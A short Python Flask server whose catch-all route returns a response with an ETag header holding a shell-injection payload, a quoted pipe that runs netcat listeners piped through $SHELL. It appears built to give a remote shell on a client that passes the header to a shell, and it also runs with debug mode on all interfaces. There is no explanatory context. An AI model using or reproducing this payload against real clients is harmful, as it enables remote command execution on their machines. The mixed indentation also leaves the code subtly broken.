from flask import Response, Flask, render_template, render_template_string, request
import base64, os.path

app = Flask(__name__)      
 
@app.route('/')
def home():
	return render_template('home.html')

@app.route('/<string:test>')
def test(test):
	resp = Response("Foo bar baz")
	resp.headers['ETag'] = '\"|nc -lvp 9998 | $SHELL | nc -lvp 9999\"'
        return resp


if __name__ == '__main__':
	app.run(host='0',port=80,debug=True)
